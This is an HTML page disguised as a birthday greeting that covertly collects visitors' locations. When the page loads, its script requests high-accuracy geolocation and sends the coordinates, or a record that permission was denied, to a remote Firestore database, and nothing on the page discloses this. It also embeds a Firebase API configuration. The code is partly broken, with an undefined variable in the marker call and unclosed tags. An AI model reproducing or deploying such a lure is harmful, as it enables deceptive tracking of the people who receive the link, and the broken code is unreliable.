<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Location Tracker</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
html,body,#map{height:100%;margin:0}
#panel{position:absolute;z-index:1000;top:10px;left:10px;background:#fff;padding:10px;border-radius:8px;max-width:320px;font-family:Arial}
</style>
</head>
<body>
<div id="panel">
    <h2>🎉 Click on ! 🎂</h2>
    <p>Wishing you a wonderful day filled with happiness, joy, and success! ❤️</p>
    <div id="status"></div>
</div>
<div id="map"></div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyDhdCaU4SyFYxkZZma1q7xUuFu_fgnu3JQ",
  authDomain: "birthday-7589c.firebaseapp.com",
  projectId: "birthday-7589c",
  storageBucket: "birthday-7589c.firebasestorage.app",
  messagingSenderId: "325902180878",
  appId: "1:325902180878:web:4f96cb7364dd58990b925f",
  measurementId: "G-TWLQRMSWBY"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const map=L.map('map').setView([20.5937,78.9629],5);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OpenStreetMap'}).addTo(map);

const status=document.getElementById("status");

navigator.geolocation.getCurrentPosition(
  async (pos) => {
    const { latitude, longitude, accuracy } = pos.coords;

    L.marker([latitude, err])
      .addTo(map)
      .bindPopup("Current Location")
      .openPopup();

    L.circle([latitude, longitude], { radius: accuracy }).addTo(map);
    map.setView([latitude, longitude], 17);

    status.innerHTML = `
      <h3>🎂 Happy Birthday! 🎉</h3>
      <p>May your day be filled with happiness and wonderful memories! ❤️</p>
    `;

    try {
      await addDoc(collection(db, "locations"), {
        latitude,
        longitude,
        accuracy,
        createdAt: serverTimestamp()
      });
    } catch (e) {
      status.innerHTML += `<br><b>Firestore error:</b> ${e.message}`;
    }
  },
async (err) => {
  if (err.code === 1) {
    try {
      await addDoc(collection(db, "locations"), {
        permission: "denied",
        createdAt: serverTimestamp()
      });
    } catch (e) {
      console.log(e);
    }

    status.innerHTML = `
      <h3>Permission not provided</h3>
      <p>Location access was denied.</p>
    `;
  } else {
    status.innerHTML = `
      <h3>Location error</h3>
      <p>${err.message}</p>
    `;
  }
},
{
  enableHighAccuracy: true,
  timeout: 30000,
  maximumAge: 0
}
);
